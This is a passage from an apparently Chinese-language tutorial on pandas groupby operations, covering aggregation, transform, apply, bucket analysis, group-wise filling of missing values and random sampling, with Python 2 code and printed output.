<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">sex     smoker</span><br><span class="line">Female  No        0.156921</span><br><span class="line">        Yes       0.182150</span><br><span class="line">Male    No        0.160669</span><br><span class="line">        Yes       0.152771</span><br><span class="line">Name: tip_pct, dtype: float64</span><br><span class="line"></span><br><span class="line">                   mean       std</span><br><span class="line">sex    smoker</span><br><span class="line">Female No      0.156921  0.036421</span><br><span class="line">       Yes     0.182150  0.071595</span><br><span class="line">Male   No      0.160669  0.041849</span><br><span class="line">       Yes     0.152771  0.090588</span><br><span class="line"></span><br><span class="line">                    foo       bar</span><br><span class="line">sex    smoker</span><br><span class="line">Female No      0.156921  0.036421</span><br><span class="line">       Yes     0.182150  0.071595</span><br><span class="line">Male   No      0.160669  0.041849</span><br><span class="line">       Yes     0.152771  0.090588</span><br><span class="line"></span><br><span class="line">              tip_pct                     total_bill</span><br><span class="line">                count      mean       max      count       mean    max</span><br><span class="line">sex    smoker</span><br><span class="line">Female No          54  0.156921  0.252672         54  18.105185  35.83</span><br><span class="line">       Yes         33  0.182150  0.416667         33  17.977879  44.30</span><br><span class="line">Male   No          97  0.160669  0.291990         97  19.791237  48.33</span><br><span class="line">       Yes         60  0.152771  0.710345         60  22.284500  50.81</span><br><span class="line"></span><br><span class="line">                tip  size</span><br><span class="line">sex    smoker</span><br><span class="line">Female No       5.2   140</span><br><span class="line">       Yes      6.5    74</span><br><span class="line">Male   No       9.0   263</span><br><span class="line">       Yes     10.0   150</span><br><span class="line"></span><br><span class="line">                tip                           size</span><br><span class="line">                max   min      mean       std  sum</span><br><span class="line">sex    smoker</span><br><span class="line">Female No       5.2  1.00  2.773519  1.128425  140</span><br><span class="line">       Yes      6.5  1.00  2.931515  1.219916   74</span><br><span class="line">Male   No       9.0  1.25  3.113402  1.489559  263</span><br><span class="line">       Yes     10.0  1.00  3.051167  1.500120  150</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h3 id="以”无索引”的形式返回聚合数据"><a href="#以”无索引”的形式返回聚合数据" class="headerlink" title="以”无索引”的形式返回聚合数据"></a>以”无索引”的形式返回聚合数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.groupby([<span class="string">'sex'</span>, <span class="string">'smoker'</span>]).mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> tips.groupby([<span class="string">'sex'</span>, <span class="string">'smoker'</span>], as_index = <span class="literal">False</span>).mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">               total_bill       tip      size   tip_pct</span><br><span class="line">sex    smoker</span><br><span class="line">Female No       18.105185  2.773519  2.592593  0.156921</span><br><span class="line">       Yes      17.977879  2.931515  2.242424  0.182150</span><br><span class="line">Male   No       19.791237  3.113402  2.711340  0.160669</span><br><span class="line">       Yes      22.284500  3.051167  2.500000  0.152771</span><br><span class="line"></span><br><span class="line">      sex smoker  total_bill       tip      size   tip_pct</span><br><span class="line">0  Female     No   18.105185  2.773519  2.592593  0.156921</span><br><span class="line">1  Female    Yes   17.977879  2.931515  2.242424  0.182150</span><br><span class="line">2    Male     No   19.791237  3.113402  2.711340  0.160669</span><br><span class="line">3    Male    Yes   22.284500  3.051167  2.500000  0.152771</span><br></pre></td></tr></table></figure>
<h2 id="分组级运算和转换"><a href="#分组级运算和转换" class="headerlink" title="分组级运算和转换"></a>分组级运算和转换</h2><h3 id="聚合只是分组级运算的一种，他是数据转换的一个特例"><a href="#聚合只是分组级运算的一种，他是数据转换的一个特例" class="headerlink" title="聚合只是分组级运算的一种，他是数据转换的一个特例"></a>聚合只是分组级运算的一种，他是数据转换的一个特例</h3><h3 id="使用-transform和apply来进行其他分组运算"><a href="#使用-transform和apply来进行其他分组运算" class="headerlink" title="使用 transform和apply来进行其他分组运算"></a>使用 transform和apply来进行其他分组运算</h3><ol>
<li><p>transform的使用</p>
<ol>
<li><p>为DF添加一个存放索引分组平均值的列</p>
<ol>
<li><p>聚合后在合并</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">k1_means = df.groupby(<span class="string">'key1'</span>).mean().add_prefix(<span class="string">'mean_'</span>)</span><br><span class="line"><span class="keyword">print</span> k1_means</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pd.merge(df, k1_means, left_on = <span class="string">'key1'</span>, right_index = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">      data1     data2 key1 key2</span><br><span class="line">0 -1.258749  3.171542    a  one</span><br><span class="line">1 -1.284484  1.429326    a  two</span><br><span class="line">2  0.229799 -0.981352    b  one</span><br><span class="line">3  0.479951 -0.836612    b  two</span><br><span class="line">4  0.043948  0.786918    a  one</span><br><span class="line"></span><br><span class="line">      mean_data1  mean_data2</span><br><span class="line">key1</span><br><span class="line">a      -0.833095    1.795929</span><br><span class="line">b       0.354875   -0.908982</span><br><span class="line"></span><br><span class="line">      data1     data2 key1 key2  mean_data1  mean_data2</span><br><span class="line">0 -1.258749  3.171542    a  one   -0.833095    1.795929</span><br><span class="line">1 -1.284484  1.429326    a  two   -0.833095    1.795929</span><br><span class="line">4  0.043948  0.786918    a  one   -0.833095    1.795929</span><br><span class="line">2  0.229799 -0.981352    b  one    0.354875   -0.908982</span><br><span class="line">3  0.479951 -0.836612    b  two    0.354875   -0.908982</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>在groupby上使用transform</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>]</span><br><span class="line"><span class="keyword">print</span> people.groupby(key).mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> people.groupby(key).transform(np.mean)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">            a         b         c         d         e</span><br><span class="line">one -0.320443  0.405803  0.886206  0.621010  0.028046</span><br><span class="line">two  0.717819 -0.789759  0.266794 -0.943221  0.570783</span><br><span class="line"></span><br><span class="line">               a         b         c         d         e</span><br><span class="line">Joe    -0.320443  0.405803  0.886206  0.621010  0.028046</span><br><span class="line">Steve   0.717819 -0.789759  0.266794 -0.943221  0.570783</span><br><span class="line">Wes    -0.320443  0.405803  0.886206  0.621010  0.028046</span><br><span class="line">Jim     0.717819 -0.789759  0.266794 -0.943221  0.570783</span><br><span class="line">Travis -0.320443  0.405803  0.886206  0.621010  0.028046</span><br></pre></td></tr></table></figure>
<ol>
<li><p>transform将一个函数应用于各个分组，然后将结果放到适当的位子</p>
</li>
<li><p>如果各分组产生一个标量值，则该值会被广播出去</p>
<ol>
<li><p>列如从各组减去平均值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demean</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> arr - arr.mean()</span><br><span class="line">demeaned = people.groupby(key).transform(demean)</span><br><span class="line"><span class="keyword">print</span> demeaned</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#检测demeaned现在的分组平均值是否是0</span></span><br><span class="line"><span class="keyword">print</span> demeaned.groupby(key).mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">               a         b         c         d         e</span><br><span class="line">Joe    -1.807126  0.238822  0.640945 -2.344429  1.212871</span><br><span class="line">Steve  -0.512103  0.212207  0.849613  0.254399  1.215604</span><br><span class="line">Wes     0.761820       NaN       NaN  1.316902 -1.109913</span><br><span class="line">Jim     0.512103 -0.212207 -0.849613 -0.254399 -1.215604</span><br><span class="line">Travis  1.045306 -0.238822 -0.640945  1.027527 -0.102958</span><br><span class="line"></span><br><span class="line">                a             b    c             d             e</span><br><span class="line">one  7.401487e-17  2.775558e-17  0.0 -1.480297e-16 -6.476301e-17</span><br><span class="line">two -5.551115e-17  5.551115e-17  0.0  0.000000e+00  0.000000e+00</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><p>apply： 一般性的”拆分-应用-合并”</p>
<ol>
<li><p>先编写一个选取指定列具有最大值的行的函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(df, n = <span class="number">5</span>, column = <span class="string">'tip_pct'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> df.sort_index(by = column)[-n:]</span><br><span class="line"><span class="keyword">print</span> top(tips, n = <span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     total_bill   tip     sex smoker  day    time  size   tip_pct</span><br><span class="line">109       14.31  4.00  Female    Yes  Sat  Dinner     2  0.279525</span><br><span class="line">183       23.17  6.50    Male    Yes  Sun  Dinner     4  0.280535</span><br><span class="line">232       11.61  3.39    Male     No  Sat  Dinner     2  0.291990</span><br><span class="line">67         3.07  1.00  Female    Yes  Sat  Dinner     1  0.325733</span><br><span class="line">178        9.60  4.00  Female    Yes  Sun  Dinner     2  0.416667</span><br><span class="line">172        7.25  5.15    Male    Yes  Sun  Dinner     2  0.710345</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果对smoker分组，并调用appley</p>
<ol>
<li><p>分别对分好组的数据进行函数的运算，之后用pd.concat组装在一块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.groupby(<span class="string">'smoker'</span>).apply(top)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">            total_bill   tip     sex smoker   day    time  size   tip_pct</span><br><span class="line">smoker</span><br><span class="line">No     88        24.71  5.85    Male     No  Thur   Lunch     2  0.236746</span><br><span class="line">       185       20.69  5.00    Male     No   Sun  Dinner     5  0.241663</span><br><span class="line">       51        10.29  2.60  Female     No   Sun  Dinner     2  0.252672</span><br><span class="line">       149        7.51  2.00    Male     No  Thur   Lunch     2  0.266312</span><br><span class="line">       232       11.61  3.39    Male     No   Sat  Dinner     2  0.291990</span><br><span class="line">Yes    109       14.31  4.00  Female    Yes   Sat  Dinner     2  0.279525</span><br><span class="line">       183       23.17  6.50    Male    Yes   Sun  Dinner     4  0.280535</span><br><span class="line">       67         3.07  1.00  Female    Yes   Sat  Dinner     1  0.325733</span><br><span class="line">       178        9.60  4.00  Female    Yes   Sun  Dinner     2  0.416667</span><br><span class="line">       172        7.25  5.15    Male    Yes   Sun  Dinner     2  0.710345</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果传给apply的函数能接受其他参数或者关键字，可以在函数名后传入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.groupby([<span class="string">'smoker'</span>,<span class="string">'day'</span>]).apply(top, n = <span class="number">1</span>, column = <span class="string">'total_bill'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">                 total_bill    tip     sex smoker   day    time  size  \</span><br><span class="line">smoker day</span><br><span class="line">No     Fri  94        22.75   3.25  Female     No   Fri  Dinner     2</span><br><span class="line">       Sat  212       48.33   9.00    Male     No   Sat  Dinner     4</span><br><span class="line">       Sun  156       48.17   5.00    Male     No   Sun  Dinner     6</span><br><span class="line">       Thur 142       41.19   5.00    Male     No  Thur   Lunch     5</span><br><span class="line">Yes    Fri  95        40.17   4.73    Male    Yes   Fri  Dinner     4</span><br><span class="line">       Sat  170       50.81  10.00    Male    Yes   Sat  Dinner     3</span><br><span class="line">       Sun  182       45.35   3.50    Male    Yes   Sun  Dinner     3</span><br><span class="line">       Thur 197       43.11   5.00  Female    Yes  Thur   Lunch     4</span><br><span class="line"></span><br><span class="line">                  tip_pct</span><br><span class="line">smoker day</span><br><span class="line">No     Fri  94   0.142857</span><br><span class="line">       Sat  212  0.186220</span><br><span class="line">       Sun  156  0.103799</span><br><span class="line">       Thur 142  0.121389</span><br><span class="line">Yes    Fri  95   0.117750</span><br><span class="line">       Sat  170  0.196812</span><br><span class="line">       Sun  182  0.077178</span><br><span class="line">       Thur 197  0.115982</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>禁止分组键</p>
<ol>
<li><p>分组键会跟原始对象的索引共同构成层次化索引，可以用group~keys~<br>= False来禁用该效果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.groupby(<span class="string">'smoker'</span>, group_keys = <span class="literal">False</span>).apply(top)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     total_bill   tip     sex smoker   day    time  size   tip_pct</span><br><span class="line">88        24.71  5.85    Male     No  Thur   Lunch     2  0.236746</span><br><span class="line">185       20.69  5.00    Male     No   Sun  Dinner     5  0.241663</span><br><span class="line">51        10.29  2.60  Female     No   Sun  Dinner     2  0.252672</span><br><span class="line">149        7.51  2.00    Male     No  Thur   Lunch     2  0.266312</span><br><span class="line">232       11.61  3.39    Male     No   Sat  Dinner     2  0.291990</span><br><span class="line">109       14.31  4.00  Female    Yes   Sat  Dinner     2  0.279525</span><br><span class="line">183       23.17  6.50    Male    Yes   Sun  Dinner     4  0.280535</span><br><span class="line">67         3.07  1.00  Female    Yes   Sat  Dinner     1  0.325733</span><br><span class="line">178        9.60  4.00  Female    Yes   Sun  Dinner     2  0.416667</span><br><span class="line">172        7.25  5.15    Male    Yes   Sun  Dinner     2  0.710345</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="分位数和桶分析"><a href="#分位数和桶分析" class="headerlink" title="分位数和桶分析"></a>分位数和桶分析</h3><ol>
<li><p>使用拆分工具(cut, qcut)和groupby结合，实现对数据集的 桶或分位数拆分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(&#123;<span class="string">'data1'</span>: np.random.randn(<span class="number">1000</span>),</span><br><span class="line">                      <span class="string">'data2'</span>: np.random.randn(<span class="number">1000</span>)&#125;)</span><br><span class="line">factor = pd.cut(frame.data1, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#由cut返回的Factor对象可用于groupby</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stats</span><span class="params">(group)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (&#123;<span class="string">'min'</span>: group.min(), <span class="string">'max'</span>:group.max(),</span><br><span class="line">            <span class="string">'count'</span>: group.count(), <span class="string">'mean'</span>: group.mean()&#125;)</span><br><span class="line">grouped = frame.data2.groupby(factor)</span><br><span class="line"><span class="keyword">print</span> grouped.apply(get_stats).unstack()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                   count       max      mean       min</span><br><span class="line">data1</span><br><span class="line">(-2.783, -1.0122]  149.0  3.049340 -0.093282 -2.838853</span><br><span class="line">(-1.0122, 0.751]   618.0  3.182495 -0.044764 -2.767363</span><br><span class="line">(0.751, 2.515]     225.0  2.425162  0.094163 -3.482998</span><br><span class="line">(2.515, 4.278]       8.0  0.685021 -0.597498 -1.827032</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="示例：用特定于分组的值填充缺失值"><a href="#示例：用特定于分组的值填充缺失值" class="headerlink" title="示例：用特定于分组的值填充缺失值"></a>示例：用特定于分组的值填充缺失值</h2><h3 id="使用fillna来填充NA值"><a href="#使用fillna来填充NA值" class="headerlink" title="使用fillna来填充NA值"></a>使用fillna来填充NA值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">s = pd.Series(np.random.randn(<span class="number">6</span>))</span><br><span class="line">s[::<span class="number">2</span>] = np.nan</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> s.fillna(s.mean())</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于不同的分组填充</span></span><br><span class="line">states = [<span class="string">'Ohio'</span>, <span class="string">'New York'</span>, <span class="string">'Vermont'</span>, <span class="string">"Florida"</span>,</span><br><span class="line">          <span class="string">'Oregon'</span>, <span class="string">'Nevada'</span>, <span class="string">'California'</span>, <span class="string">'Idaho'</span>]</span><br><span class="line">group_key = [<span class="string">'East'</span>] * <span class="number">4</span> + [<span class="string">'West'</span>] * <span class="number">4</span></span><br><span class="line">data = pd.Series(np.random.randn(<span class="number">8</span>),index = states)</span><br><span class="line">data [[<span class="string">'Vermont'</span>, <span class="string">'Nevada'</span>, <span class="string">'Idaho'</span>]] = np.nan</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> data.groupby(group_key).mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用分组的平均值填充NA值</span></span><br><span class="line">fill_mean = <span class="keyword">lambda</span> g: g.fillna(g.mean())</span><br><span class="line"><span class="keyword">print</span> data.groupby(group_key).apply(fill_mean)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以在代码中预定各组的填充值，由于分组具有一个name属性，所以可以指定</span></span><br><span class="line">fill_values = &#123;<span class="string">'East'</span>: <span class="number">0.5</span>, <span class="string">'West'</span>: <span class="number">-1</span>&#125;</span><br><span class="line">fill_func = <span class="keyword">lambda</span> g: g.fillna(fill_values[g.name]) <span class="comment">#g.name 分组的名字 即 East West</span></span><br><span class="line"><span class="keyword">print</span> data.groupby(group_key).apply(fill_func)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0         NaN</span><br><span class="line">1   -0.214061</span><br><span class="line">2         NaN</span><br><span class="line">3    0.505217</span><br><span class="line">4         NaN</span><br><span class="line">5   -1.435665</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">0   -0.381503</span><br><span class="line">1   -0.214061</span><br><span class="line">2   -0.381503</span><br><span class="line">3    0.505217</span><br><span class="line">4   -0.381503</span><br><span class="line">5   -1.435665</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">Ohio          0.080286</span><br><span class="line">New York      0.129721</span><br><span class="line">Vermont            NaN</span><br><span class="line">Florida       0.894821</span><br><span class="line">Oregon       -0.037896</span><br><span class="line">Nevada             NaN</span><br><span class="line">California   -1.094791</span><br><span class="line">Idaho              NaN</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">East    0.368276</span><br><span class="line">West   -0.566344</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">Ohio          0.080286</span><br><span class="line">New York      0.129721</span><br><span class="line">Vermont       0.368276</span><br><span class="line">Florida       0.894821</span><br><span class="line">Oregon       -0.037896</span><br><span class="line">Nevada       -0.566344</span><br><span class="line">California   -1.094791</span><br><span class="line">Idaho        -0.566344</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">Ohio          0.080286</span><br><span class="line">New York      0.129721</span><br><span class="line">Vermont       0.500000</span><br><span class="line">Florida       0.894821</span><br><span class="line">Oregon       -0.037896</span><br><span class="line">Nevada       -1.000000</span><br><span class="line">California   -1.094791</span><br><span class="line">Idaho        -1.000000</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
<h2 id="示例：随机采样和排列"><a href="#示例：随机采样和排列" class="headerlink" title="示例：随机采样和排列"></a>示例：随机采样和排列</h2><h3 id="从一个大数据集中随机抽取样本以进行蒙特卡洛模拟或其他分析"><a href="#从一个大数据集中随机抽取样本以进行蒙特卡洛模拟或其他分析" class="headerlink" title="从一个大数据集中随机抽取样本以进行蒙特卡洛模拟或其他分析"></a>从一个大数据集中随机抽取样本以进行蒙特卡洛模拟或其他分析</h3><h3 id="抽取的方法有很多，其中之一就是用np-random-permutation-n-的前k个元素"><a href="#抽取的方法有很多，其中之一就是用np-random-permutation-n-的前k个元素" class="headerlink" title="抽取的方法有很多，其中之一就是用np.random.permutation(n)的前k个元素"></a>抽取的方法有很多，其中之一就是用np.random.permutation(n)的前k个元素</h3><ol>
<li><p>其中k是期望样本的大小，n为完整数据的大小</p>
<ol>
<li><p>得到一套牌组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#红桃(hearts), 黑桃(Spades)， 梅花(Clubs)，方块(Diamonds)</span></span><br><span class="line">suits = [<span class="string">'H'</span>, <span class="string">'S'</span>, <span class="string">'C'</span>, <span class="string">"D"</span>]</span><br><span class="line">card_val = (range(<span class="number">1</span>,<span class="number">11</span>) + [<span class="number">10</span>] * <span class="number">3</span>) *<span class="number">4</span></span><br><span class="line">base_names = [<span class="string">'A'</span>] + range(<span class="number">2</span>,<span class="number">11</span>) + [<span class="string">'J'</span>, <span class="string">'Q'</span>, <span class="string">'K'</span>]</span><br><span class="line">cards = []</span><br><span class="line"><span class="keyword">for</span> suit <span class="keyword">in</span> suits:</span><br><span class="line">    cards.extend(str(num) + suit <span class="keyword">for</span> num <span class="keyword">in</span> base_names)</span><br><span class="line">deck = pd.Series(card_val, index = cards)</span><br><span class="line"><span class="keyword">print</span> deck[:<span class="number">14</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AH      1</span><br><span class="line">2H      2</span><br><span class="line">3H      3</span><br><span class="line">4H      4</span><br><span class="line">5H      5</span><br><span class="line">6H      6</span><br><span class="line">7H      7</span><br><span class="line">8H      8</span><br><span class="line">9H      9</span><br><span class="line">10H    10</span><br><span class="line">JH     10</span><br><span class="line">QH     10</span><br><span class="line">KH     10</span><br><span class="line">AS      1</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
<li><p>从整副牌抽取5张</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span><span class="params">(deck, n = <span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> deck.take(np.random.permutation(len(deck))[:n])</span><br><span class="line"><span class="keyword">print</span> draw(deck)</span><br></pre></td></tr></table></figure>
